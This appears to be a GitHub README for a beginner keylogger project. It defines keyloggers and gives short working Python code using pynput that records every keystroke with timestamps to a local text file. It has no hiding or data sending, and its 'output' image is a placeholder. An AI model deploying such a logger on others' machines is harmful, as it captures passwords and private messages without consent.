##### Author: Allana Gibson 
##### [LinkedIn](https://www.linkedin.com/in/allana-gibson/)

## KeyLogger Project

- A keylogger is a type of monitoring software `or malware` that is used to collect every keystroke the user types.
#### Reasons for use:
1. Hackers trying to access **personal data**.
2. IT organizations attempting to troubleshoot **technical problems**.

### Here is the source code of my program (in python):

```markdown
from pynput.keyboard import Key, Listener
import logging

logKeystroke = ""

logging.basicConfig(filename=(logKeystroke + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
                                                                   # prints the text with date & time
def on_press(key):
    logging.info(str(key)) #when a key is pressed it will store the info in file

with Listener(on_press=on_press) as listener:
    listener.join()
```
- The output will extract a `.txt` file on to the folder displaying every keystroke pressed.
- The user will have to terminate the program in `Task Manager` to end the application.

### Here is a picture of the output file:
![This is an image](https://myoctocat.com/assets/images/base-octocat.svg)
